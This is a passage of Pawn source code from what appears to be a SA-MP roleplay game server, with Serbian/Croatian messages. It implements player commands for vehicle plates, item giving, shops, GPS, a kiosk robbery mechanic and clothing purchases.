		VehicleInfo[ izbor ][ vTeh ] = 3; SaveVehicle( izbor );
		SCM( playerid, SVETLOPLAVA, "Uzeo si tablice idi stavi ih na auto( /vehicle postavitable )." );
		SCM( playerid, CRVENA, "Kada postavite tablice, auto se respawna." );
		return 1;
	}
	else if( strcmp( item, "postavitable",true) == 0) {
        if( sscanf( params, "s[32]d", item, izbor ) ) {
			SendUsageMessage( playerid, "/vehicle postavitable [ broj vozila ]" );
			SCM( playerid, BELA, "Listu vozila pogledajte pod /vehicle list." );
			return 1;
		}
		if( izbor == -1 || izbor == 0 ) return SendErrorMessage( playerid, "Pogresan broj vozila." );

        if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == izbor ) { }
        else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == izbor ) { }
        else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == izbor ) { }
        else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == izbor ) { }
		else return SendErrorMessage( playerid, "Ne posedujete vozilo ciji ste broj uneli." );

		new Float:x, Float:y, Float:z;
		GetVehiclePos( VehicleInfo[ izbor ][ vID ], x, y, z );
		if( !IsPlayerInRangeOfPoint( playerid, 7.0, x, y, z ) )
		{
			SendErrorMessage( playerid, "Nisi u blizini auta.");
			return 1;
		}
		if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Moras biti van auta!" );
        if( VehicleInfo[ izbor ][ vTeh ] != 3 ) return SendErrorMessage( playerid, "Nisi uzeo tablice iz policijske stanice!");
		VehicleInfo[ izbor ][ vTeh ] = 0 ; VehicleInfo[ izbor ][ vReg ] = 1; SaveVehicle( izbor );
		SetTimerEx( "Postaviotable", 5000, false, "ii", playerid, izbor );
		ApplyAnimation( playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0,5000, 0);
		ApplyAnimation( playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0,5000, 0);
		return 1;
	}
	else if( strcmp( item, "list",true) == 0) {
	    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	    if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 && PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1 && PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1 && PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1 ) return SendErrorMessage( playerid, "Nemate nijedno vozilo!");
	    if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] != -1)
	    {
	        format( globalstring, sizeof( globalstring ), "Vozilo: 1 || Broj: %d || Ime: %s\n", PlayerInfo[ playerid ][ xVoziloID ][ 0 ], getVehicleName( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] ) );
			strcat( DialogStrgEx, globalstring );
		}
		if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] != -1)
	    {
            format( globalstring, sizeof( globalstring ), "Vozilo: 2 || Broj: %d || Ime: %s\n", PlayerInfo[ playerid ][ xVoziloID ][ 1 ], getVehicleName( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] ) );
			strcat( DialogStrgEx, globalstring );
		}
		if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] != -1)
	    {
            format( globalstring, sizeof( globalstring ), "Vozilo: 3 || Broj: %d || Ime: %s\n", PlayerInfo[ playerid ][ xVoziloID ][ 2 ], getVehicleName( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] ) );
			strcat( DialogStrgEx, globalstring );
		}
		if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] != -1)
	    {
            format( globalstring, sizeof( globalstring ), "Vozilo: 4 || Broj: %d || Ime: %s\n", PlayerInfo[ playerid ][ xVoziloID ][ 3 ], getVehicleName( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] ) );
            strcat( DialogStrgEx, globalstring );
		}
		ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	    return 1;
	}
	else {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/vehicle [opcija]");
     	SCM( playerid, BELA, "[Opcije] list, registruj, postavitable");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
   	}
	return true;
}

CMD:daj( playerid, params[] ) {
    new x_nr[32],
		giveplayerid;

	if( sscanf( params, "s[32] ", x_nr ) ) {
		SendUsageMessage( playerid, "/daj [Opcija] [ ID/Deo Imena ] [ kolicina ]");
		SCM( playerid, BELA, "OPCIJE: oruzje, sat, telefon, cigare, upaljac, mats, bitcoin");
		return 1;
	}
	if(strcmp(x_nr,"oruzje",true) == 0) {
	    new kolicina;
    	if( sscanf( params, "s[32]ud", x_nr, giveplayerid, kolicina ) ) return SendUsageMessage( playerid, "/daj oruzje [ ID/Deo Imena ] [ kolicina ]");
        new Float:H; GetPlayerHealth( playerid, H );
        if(PlayerInfo[playerid][xLevel] < 2) return SendErrorMessage(playerid, "Morate biti level 2+!");
		if( H < 15.0 ) return SendErrorMessage( playerid, "Ne mozete dati oruzje, ako imate manje od 15HP." );
		if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Moras biti van vozila." );
		if( IsPlayerInAnyVehicle( giveplayerid ) ) return SendErrorMessage( playerid, "Igrac mora biti van vozila." );
		if( giveplayerid != INVALID_PLAYER_ID ) {
  		    if( PlayerLogged[ giveplayerid ] == true ) {
     			if( IsPlayerNearPlayer( 3.0, playerid, giveplayerid ) ) {
					new weapon = GetWeapon( playerid );

                    if( GetFactionType( playerid ) == ORG_TIP_PD || GetFactionType( playerid ) == ORG_TIP_HITM ) {
				        SendErrorMessage( playerid, "PD/FBI/CIA/HITMAN nema razloga davati oruzja!");
						return 1;
					}
                    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na dmu." );
					if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati oruzje!");
					if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Morate biti najmanje level 3 da bi ste mogli koristit ovu komandu!");
					if( PlayerInfo[ giveplayerid ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Igrac nije level 2!");
					if( weapon == 0 ) return SendErrorMessage( playerid, "Nemate nijedno oruzje u ruci!");
                    if(isForbidenWeapon(weapon)) return SendErrorMessage(playerid, "Ne mozes davati zabranjena oruzija!");
					if( IsMeleeWeapon( weapon ) ) {
					    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
					    RemovePlayerWeapon( playerid, weapon );
					    
					    SendInfoMessage( playerid, "Dali ste %s %s .", ImeIgraca( giveplayerid ), WeapNames[ weapon ] );
						SendInfoMessage( giveplayerid, "%s vam je dao %s .", ImeIgraca( playerid ), WeapNames[ weapon ] );
					}
					else {
					    if( kolicina < 1 ) return SendErrorMessage( playerid, "Kolicina ne moze u minus.");
						if( kolicina > GetPlayerAmmo( playerid ) ) return SendErrorMessage( playerid, "Nemas toliko municije za dati." );
						
						new mplayerid = GetPlayerAmmo( playerid ), mnova = mplayerid - kolicina;
						
					    if( kolicina == GetPlayerAmmo( playerid ) ) {
					        RemovePlayerWeapon( playerid, weapon );
						}
					    else {
					        if( GetWeapon( giveplayerid ) != GetWeapon( playerid ) ) return SendErrorMessage( playerid, "Igrac nema to oruzje u ruci( ako zelis ceo gun kucaj tacno metkova )." );
                            SetWeaponAmmo( playerid, weapon, mnova );
						}
					    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
						
						SendInfoMessage( playerid, "Dali ste %s %s sa %d metaka .", ImeIgraca( giveplayerid ), WeapNames[ weapon ], kolicina );
						SendInfoMessage( giveplayerid, "%s vam je dao %s sa %d metaka.", ImeIgraca( playerid ), WeapNames[ weapon ], kolicina );
					}
					antiCheatCS[ giveplayerid ][ WeaponDetect ] = 3;
					GiveWeaponToPlayer( giveplayerid, weapon, kolicina );
					SetPlayerArmedWeapon( giveplayerid, weapon );

					format( globalstring, sizeof( globalstring ), "* %s daje oruzje %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
					PorukaRadius( 5.0, playerid, globalstring, LJUBICASTA );

                    new string1[ 128 ];
                    format( string1, sizeof( string1 ), "Igrac %s je dao oruzije %s sa %d metkova igracu %s.", ImeIgraca( playerid ), WeapNames[ weapon ], kolicina, ImeIgraca( giveplayerid ) );
                    LogSave( "Ostalo/LogDajOruzje.log", string1 );

				} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
			}
		} else SendErrorMessage( playerid, "Taj igrac nije online !");
		return 1;
    }
	else if(strcmp(x_nr,"cigare",true) == 0) {
	    new moneys;
    	if( sscanf( params, "s[32]ui", x_nr, giveplayerid, moneys ) ) return SendUsageMessage( playerid, "/daj cigare [ ID/Deo Imena ] [ kolicina ]");
		if( PlayerLogged[ giveplayerid ] == true ) {
  			if( giveplayerid != INVALID_PLAYER_ID ) {
     			if( IsPlayerNearPlayer( 3.0, playerid, giveplayerid ) ) {
			    	if( giveplayerid == playerid) return SendErrorMessage( playerid, "Ne mozete sami sebi davati cigarete!");
	    			if( ( PlayerInfo[ giveplayerid ][ xCigare ] + moneys ) > 100 ) return SendErrorMessage( playerid, "Osoba moze najvise nositi 100 cigareta kod sebe");
	    			if( moneys > 0 && PlayerInfo[ playerid ][ xCigare ] >= moneys ) {
	    			    PlayerInfo[ giveplayerid ][ xCigare ] += moneys;
   	    				PlayerInfo[ playerid ][ xCigare ] -= moneys;
				        PlayerPlaySound( giveplayerid, 1052, 0.0, 0.0, 0.0 );
				        
				        SendInfoMessage( playerid, "Poslali ste %s (ID: %d), %d cigareta.", ImeIgraca( giveplayerid ), giveplayerid, moneys );
			     		SendInfoMessage( giveplayerid, "Primili ste %d cigareta od %s (ID: %d).", moneys, ImeIgraca( playerid ), playerid);

				    	format( globalstring, sizeof( globalstring ), "* %s vadi kutiju cigareta i daje cigaretu %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
        				PorukaRadius( 3.0, playerid, globalstring, LJUBICASTA );
				    } else SendErrorMessage( playerid, "Nemate toliko cigareta kod sebe !");
				} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
 			}
		} else SendErrorMessage( playerid, "Taj igrac nije online !");
		return 1;
    }
    else if(strcmp(x_nr,"upaljac",true) == 0) {
    	if( sscanf( params, "s[32]u", x_nr, giveplayerid ) ) {
			SendUsageMessage( playerid, "/daj upaljac [ ID/Deo Imena ]");
			return 1;
		}
  		if( giveplayerid != INVALID_PLAYER_ID ) {
  		    if( PlayerLogged[ giveplayerid ] == true ) {
     			if( IsPlayerNearPlayer(3.0, playerid, giveplayerid ) ) {
			    	if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati upaljac!");
	    			if( PlayerInfo[ giveplayerid ][ xUpaljac ] == 1 ) return SendErrorMessage( playerid, "Osoba vec ima upaljac");
					if( PlayerInfo[ playerid ][ xUpaljac ] == 1 ) {
	    				PlayerInfo[ playerid ][ xUpaljac ] = 0;
					    PlayerInfo[ giveplayerid ][ xUpaljac ] = 1;
				    	PlayerPlaySound( giveplayerid, 1052, 0.0, 0.0, 0.0 );
					    format( globalstring, sizeof( globalstring ), "* %s vadi upaljac iz dzepa i daje ga %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
			         	PorukaRadius( 5.0, playerid, globalstring, LJUBICASTA );
            		} else SendErrorMessage( playerid, "Nemas upaljac !");
				} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
 			}
		} else SendErrorMessage( playerid, "Taj igrac nije online !");
		return 1;
    }
    else if(strcmp(x_nr,"telefon",true) == 0) {
    	if( sscanf(params, "s[32]u", x_nr, giveplayerid ) ) return SendUsageMessage( playerid, "/daj telefon [ ID/Deo Imena ]");
		if( PlayerLogged[ giveplayerid ] == true ) {
  			if( giveplayerid != INVALID_PLAYER_ID ) {
     			if( IsPlayerNearPlayer(3.0, playerid, giveplayerid ) ) {
			    	if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati mobilni telefon!");
	    			if( PlayerInfo[ giveplayerid ][ xBrojTelefona ] != 0) return SendErrorMessage( playerid, "Osoba vec ima mobitel!");
					if( PlayerInfo[ playerid ][ xBrojTelefona ] != 0) {
	    				PlayerInfo[ giveplayerid ][ xBrojTelefona ] = PlayerInfo[ playerid ][ xBrojTelefona ];
	    				PlayerInfo[ giveplayerid ][ xModelTelefona ] = PlayerInfo[ playerid ][ xModelTelefona ];
				    	PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
					    format( globalstring, sizeof( globalstring ), "* %s daje mobitel %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
			         	PorukaRadius( 5.0, playerid, globalstring, LJUBICASTA );
			         	PlayerInfo[ playerid ][ xBrojTelefona ] = 0;
			         	PlayerInfo[ playerid ][ xModelTelefona ] = 0;
            		} else SendErrorMessage( playerid, "Nemas mobitel !");
				} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
 			}
		} else SendErrorMessage( playerid, "Taj igrac nije online !");
		return 1;
    }
	else if(strcmp(x_nr,"sat",true) == 0) {
    	if( sscanf(params, "s[32]u", x_nr, giveplayerid ) ) return SendUsageMessage( playerid, "/daj sat [ ID/Deo Imena ]");
  		if( giveplayerid != INVALID_PLAYER_ID ) {
  			if( PlayerLogged[ giveplayerid ] == true ) {
     			if( IsPlayerNearPlayer(3.0, playerid, giveplayerid ) ) {
			    	if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati sat!");
	    			if( PlayerInfo[ giveplayerid ][ xSat ] != 0 ) return SendErrorMessage( playerid, "Osoba vec ima sat!");
					if( PlayerInfo[ playerid ][ xSat ] != 0 ) {
	    				PlayerInfo[ giveplayerid ][ xSat ] = PlayerInfo[ playerid ][ xSat ];
	    				PlayerInfo[ playerid ][ xSat ] = 0;
				    	PlayerPlaySound( giveplayerid, 1052, 0.0, 0.0, 0.0);
					    format( globalstring, sizeof( globalstring ), "* %s skida sat sa ruke i daje ga %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
			         	PorukaRadius( 5.0, playerid, globalstring, LJUBICASTA );
            		} else SendErrorMessage( playerid, "Nemas sat !");
				} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
 			}
		} else SendErrorMessage( playerid, "Taj igrac nije online !");
		return 1;
    }

    else if(strcmp(x_nr,"mats",true) == 0) {
        new moneys;
        if( sscanf( params, "s[32]ui", x_nr, giveplayerid, moneys ) ) return SendUsageMessage( playerid, "/daj mats [ ID/Deo Imena ] [ kolicina ]");
        if( PlayerLogged[ giveplayerid ] == true ) {
            if( giveplayerid != INVALID_PLAYER_ID ) {
                if( IsPlayerNearPlayer( 3.0, playerid, giveplayerid ) ) {
                    if( giveplayerid == playerid) return SendErrorMessage( playerid, "Ne mozete sami sebi davati materijale!");
                    if( moneys > 0 && PlayerInfo[ playerid ][ xMaterijali ] >= moneys ) {
                        PlayerInfo[ giveplayerid ][ xMaterijali ] += moneys;
                        PlayerInfo[ playerid ][ xMaterijali ] -= moneys;
                        SavePlayer(playerid);
                        SavePlayer(giveplayerid);
                        PlayerPlaySound( giveplayerid, 1052, 0.0, 0.0, 0.0 );
                        
                        SendInfoMessage( playerid, "Poslali ste %s (ID: %d), %d matsa.", ImeIgraca( giveplayerid ), giveplayerid, moneys );
                        SendInfoMessage( giveplayerid, "Primili ste %d matsa od %s (ID: %d).", moneys, ImeIgraca( playerid ), playerid);

                        format( globalstring, sizeof( globalstring ), "* %s vadi materijale i daje %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
                        PorukaRadius( 3.0, playerid, globalstring, LJUBICASTA );
                    } else SendErrorMessage( playerid, "Nemate toliko materijala kod sebe !");
                } else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
            }
        } else SendErrorMessage( playerid, "Taj igrac nije online !");
        return 1;
    }

    else if(strcmp(x_nr,"bitcoin",true) == 0) {
        new moneys;
        if( sscanf( params, "s[32]ui", x_nr, giveplayerid, moneys ) ) return SendUsageMessage( playerid, "/daj bitcoin [ ID/Deo Imena ] [ kolicina ]");
        if( PlayerLogged[ giveplayerid ] == true ) {
            if( giveplayerid != INVALID_PLAYER_ID ) {
                if( IsPlayerNearPlayer( 3.0, playerid, giveplayerid ) ) {
                    if( giveplayerid == playerid) return SendErrorMessage( playerid, "Ne mozete sami sebi davati bitcoine!");
                    if( moneys > 0 && PlayerInfo[ playerid ][ xBitcoin ] >= moneys ) {
                        PlayerInfo[ giveplayerid ][ xBitcoin ] += moneys;
                        PlayerInfo[ playerid ][ xBitcoin ] -= moneys;
                        SavePlayer(playerid);
                        SavePlayer(giveplayerid);
                        PlayerPlaySound( giveplayerid, 1052, 0.0, 0.0, 0.0 );
                        
                        SendInfoMessage( playerid, "Poslali ste %s (ID: %d), %d bitcoina.", ImeIgraca( giveplayerid ), giveplayerid, moneys );
                        SendInfoMessage( giveplayerid, "Primili ste %d bitcoina od %s (ID: %d).", moneys, ImeIgraca( playerid ), playerid);

                        format( globalstring, sizeof( globalstring ), "* %s salje bitcoine igracu %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
                        PorukaRadius( 3.0, playerid, globalstring, LJUBICASTA );
                    } else SendErrorMessage( playerid, "Nemate toliko bitcoina kod sebe !");
                } else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
            }
        } else SendErrorMessage( playerid, "Taj igrac nije online !");
        return 1;
    }
	return 1;
}

// 24/7 System
CMD:uzmicigaretu( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xCigare ] < 1) return SendErrorMessage( playerid, "  Nemate cigareta!");
	if( PlayerInfo[ playerid ][ xUpaljac ] == 1) {
 		ApplyAnimation( playerid, "SMOKING", "M_smk_in", 3.0, 0, 0, 0, 0, 0, 1 );
 		SetPlayerSpecialAction( playerid, 21 );
  		SCM( playerid, SRVBOJA1, "Stisni lijevu tipku misa da pocnes pusiti." );
   		SCM( playerid, SRVBOJA1, "Koristi tipku ENTER da bacis cigaretu." );
   		if( Maskuse[ playerid ] == false )
        	format( globalstring, sizeof( globalstring ), "** %s pali cigaretu i pusi.", ImeIgraca( playerid ) );
		else
		    format( globalstring, sizeof( globalstring ), "** Maska_%d pali cigaretu i pusi.", PlayerInfo[ playerid ][ xMaskID ] );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		SetPVarInt( playerid, "gSmoking", 1);
	  	PlayerInfo[ playerid ][ xCigare ] -= 1;
	  	SavePlayer( playerid );
    } else SendErrorMessage( playerid, "Nemas upaljac!");
	return 1;
}

CMD:pharmacy( playerid, params[] ) {

    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1295.9462,-1870.4811,13.5561)) {

        SPD( playerid, dialog_PHARMACY, DSL, D_NASLOV, "Solna Kiselina 50$\nPseudo 85$\nCrveni Fosfor 65$\nLysergic acid 35$\nKalcijum 25$\nAmonijum Hlorid 45$", D_ODABERI, D_ODUSTANI );
    }
    else return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u apoteci." );

    return 1;
}


CMD:buy( playerid, params[] ) {
    new businessId = GetPlayerBusinessId( playerid, VRSTA_MARKET );

	if( businessId == -1 ) {
		SendErrorMessage( playerid, "Morate biti kod kase u marketu da bi koristili ovu komandu." );
	} else if( businessId == -2 ) {
		SendErrorMessage( playerid, "Nemamo vise proizvoda!" );
	} else {
	
	    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -28.0849,-89.9528,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do kase za naplacivanje." );
		SPD( playerid, dialog_MARKETBUY, DIALOG_STYLE_TABLIST, D_NASLOV, "Pizza\t100$\nUze\t200$\nSok\t40$\nPivo\t55$\nHamburger\t60$\nPiletina\t250$\nCigare\t35$\nUpaljac\t25$\nSoda Bikarbona\t80$\nDestilovana Voda\t50$", "Kupi", "Odustani" );
	}
	return true;
}

CMD:tkupi( playerid, params[] ) {

	if(IsPlayerInAnyVehicle(playerid)) return SendErrorMessage( playerid, "Moras biti van vozila.");

    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1174.0956, -936.1318, 42.8307) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 1514.9395, -1031.0515, 23.7966) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 1202.5309, -1275.9502, 13.3616) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 1418.1516, -1721.0294, 13.5469) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 339.2676, -1771.2668, 5.1687) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 1023.6545, -1332.1298, 13.3842) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 1189.3583, -1706.9924, 13.5755) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 2083.0374, -1760.8845, 13.5625) ||
        IsPlayerInRangeOfPoint(playerid, 2.0, 2264.8145, -1309.9031, 23.9844)) {

	    ShowPlayerDialog( playerid, dialog_KIOSK, DSL, D_NASLOV, "Dopuna (20$)\nDopuna (50$)\nDopuna (100$)\nDopuna (500$)\nSprite (15$)\nCokoladica (35$)\nPivo (85$)\nCoca Cola (52$)\nCigare (35$)\nUpaljac (15$)\nBaterija (50$)", D_ODABERI, D_ODUSTANI );
	}
	else return SendErrorMessage( playerid, "Morate biti kod trafike.");
    return 1;
}

CMD:robtrafika(playerid, params[])
{
	if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Moras biti van vozila." );
	if(IsPlayerInRangeOfPoint(playerid, 2.0, 1174.0956, -936.1318, 42.8307) ||
		IsPlayerInRangeOfPoint(playerid, 2.0, 1514.9395, -1031.0515, 23.7966) ||
		IsPlayerInRangeOfPoint(playerid, 2.0, 1202.5309, -1275.9502, 13.3616) ||
		IsPlayerInRangeOfPoint(playerid, 2.0, 1418.1516, -1721.0294, 13.5469) ||
		IsPlayerInRangeOfPoint(playerid, 2.0, 339.2676, -1771.2668, 5.1687) ||
		IsPlayerInRangeOfPoint(playerid, 2.0, 1023.6545, -1332.1298, 13.3842) ||
		IsPlayerInRangeOfPoint(playerid, 2.0, 1189.3583, -1706.9924, 13.5755) ||
		IsPlayerInRangeOfPoint(playerid, 2.0, 2083.0374, -1760.8845, 13.5625) ||
		IsPlayerInRangeOfPoint(playerid, 2.0, 2264.8145, -1309.9031, 23.9844))
	{
		if( GetFactionType( playerid ) == ORG_TIP_PD ) {
			SendErrorMessage( playerid, "PD/SAJ/CIA nema razloga koristiti ovo!");
			return 1;
		}
        if( PlayerInfo[playerid][xRobanjeTrafike] != 0) return SendErrorMessage(playerid, "Rob trafike mozes pokrenuti za %d minuta!", PlayerInfo[playerid][xRobanjeTrafike]);
        if( RobTrafikaKurac{playerid} != 0) return SendErrorMessage(playerid, "Vec robas trafiku!");
		if( PlayerInfo[playerid][xWanted] >= 1) return SendErrorMessage(playerid, "Trazeni ste, ne mozete to!");
		if( GetPlayerWeapon(playerid) == 0) return SendErrorMessage(playerid, "Morate imati oruzije kod sebe!");
		TogglePlayerControllable(playerid, 0);
		TimerRobTrafika = defer RobTrafika(playerid);
		RobTrafikaKurac{playerid} = RobTrafikeTime;
		ApplyAnimation( playerid, "BOMBER", "Plant_Loop", 4.0, 1, 0, 0, 0, 0 );
		SendInfoMessage(playerid, "Zapoceli ste pljackanje trafike!Ako umrete, rob ce se prekinuti!");
	}
	else return SendErrorMessage( playerid, "Morate biti kod trafike.");
	return 1;
}

CMD:kupitelefon( playerid, params[] ) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 935.1693,-1535.8910,13.5960)) return SendErrorMessage(playerid, "Nisi u Gigatronu!");

    ShowPlayerDialog( playerid, dialog_BUY_MOBILEPHONE, DSL, D_NASLOV, "Samsung Galaxy S5 - 6.985$\nNokia Lumia 930 - 5.351$\nSony Xperia Z3 - 6.101$\nApple iPhone 6 - 4.568$\nLG Nexus 5 - 3.657$\nHTC Desire - 2.657$\nHuawei Ascend Mate - 1.245$\nAlcatel One Touch - 1.278$\nMotorola Nexus 6 - 5.975$\nBlackberry Z30 LTE - 3.422$", D_ODABERI, D_ODUSTANI );

	return true;
}

CMD:gps( playerid, params[] ) {

	SPD( playerid, dialog_GPS_FIND, DSL, "Izaberi tip:", "Vazne Lokacije\nKuca\nBiznis\nPosao", D_ODABERI, D_ODUSTANI );
	return true;
}

CMD:gpsoff( playerid, params[] ) {
	Novi_DisablePlayerCheckpoint( playerid );
	SCM( playerid, ZUTA, "Ugasili ste checkpoint.");
	CheckpointStatus[ playerid ] = 0;
	PlayerTextDrawHide(playerid, PlayerGpsRadarText[ playerid ] );
    if( IsValidDynamicMapIcon( PlayerGpsRadar[ playerid ][_pgrIconId ] ) ) {
		DestroyDynamicMapIcon( PlayerGpsRadar[ playerid ][_pgrIconId] );
	}
    PlayerGpsRadar[ playerid ][_pgrIconId] = -1;
    if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][_pgrObject ] ) ) {
		DestroyDynamicObject( PlayerGpsRadar[ playerid ][_pgrObject] );
	}
    PlayerGpsRadar[ playerid ][_pgrObject] = -1;
	return true;
}

CMD:elkor( playerid, params[] ) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 936.0370,-1542.2241,13.5960)) return SendErrorMessage(playerid, "Nisi u Gigatronu!");

    new broj;
	
    if( sscanf( params, "d", broj ) ) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/elkor [ Broj-opcije ]");
     	SCM( playerid, BELA, "[Opcije] 1. Radio");
        SCM( playerid, BELA, "[Opcije] 2. GPS za Vozilo");
		SCM( playerid, BELA, "[Cene] 1. 550$ 2. 5000$" );
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	else if( broj == 1 ) {
	    if( PlayerInfo[ playerid ][ xNovac ] < 550 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(550$)" );
		if( PlayerInfo[ playerid ][ xBoombox ] == true ) return SendErrorMessage( playerid, "Vec imate kupljen Boombox." );
		DajIgracuNovac( playerid, -550 );
		PlayerInfo[ playerid ][ xBoombox ] = true;
		SendInfoMessage( playerid, "Kupili ste Boombox(radio) koristite '/radio' ." );
		return 1;
	}
    else if( broj == 2 ) {
        if( PlayerInfo[ playerid ][ xNovac ] < 5000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(5000$)" );
        if( KupljenGPS[playerid] == 1) return SendErrorMessage( playerid, "Vec imate kupljen GPS za vozilo." );
        DajIgracuNovac( playerid, -5000 );
        KupljenGPS[playerid] = 1;
        SendInfoMessage( playerid, "Kupili ste GPS za vozilo, sada idite u svoje vozilo da ga ugradite." );
        return 1;
    }
	else SendErrorMessage( playerid, "Pogresan Broj.");

	return true;
}

// CLOTHING SYSTEM
CMD:kupiodecu( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(500$).");
	if( PlayerInfo[ playerid ][ xClan ] != 0 ) return SendErrorMessage( playerid, "Ne mozete kupiti skin jer ste u organizaciji." );
	for( new i = 1; i < MAX_BUSSINES; i++ ) {
        if( IsPlayerInRangeOfPoint( playerid, 35.0, BussinesInfo[ i ][ bExitX ], BussinesInfo[ i ][ bExitY ], BussinesInfo[ i ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BussinesInfo[ i ][ bInVW ] ) {
            if( BussinesInfo[ i ][ bType ] == VRSTA_BINCO || BussinesInfo[ i ][ bType ] == VRSTA_SUBURBAN || BussinesInfo[ i ][ bType ] == VRSTA_VICTIM || BussinesInfo[ i ][ bType ] == VRSTA_ZIP )
            {
                if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0 ) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
				ShowModelSelectionMenu( playerid, skinlist, "Select Skin");
			}
			else return SendErrorMessage( playerid, "Morate biti u butiku da bi koristili ovu komandu.");
		}
	}
	return true;
}
CMD:buyglasses( playerid, params[] ) {
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 209.8154, -33.7277, 1001.9297 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u Suburbanu." );
    if( PlayerInfo[ playerid ][ xNovac ] < 400 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(400$).");
	if( PlayerInfo[ playerid ][ xSungMask ] != 0) return SendErrorMessage( playerid, "Vec imate kupljene naocare ili masku." );
	new bandanas[13];
	bandanas[0] = 19138;
    bandanas[1] = 19022;
    bandanas[2] = 19028;
    bandanas[ 3 ] = 19033;
    bandanas[4] = 19012;
    bandanas[5] = 19006;
	bandanas[6] = 19009;
	bandanas[7] = 19008;
	bandanas[8] = 19034;
	bandanas[9] = 19035;
	bandanas[10] = 19029;
	bandanas[11] = 19139;
	bandanas[12] = 19140;
	ShowModelSelectionMenuEx( playerid, bandanas, 13, "Glasses", 1, 0.0, 0.0, 90.0);
	return true;
}

CMD:buyfbandanas( playerid, params[] ) {
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 151.2055, -92.5647, 1001.8047 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u Zipu." );
    if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(500$)." );
	if( PlayerInfo[ playerid ][ xFace ] != 0) return SendErrorMessage( playerid, "Vec imate kupljenu maramu." );
	new bandanas[9];
	bandanas[0] = 18912;
	bandanas[1] = 18913;
	bandanas[2] = 18914;
	bandanas[ 3 ] = 18915;
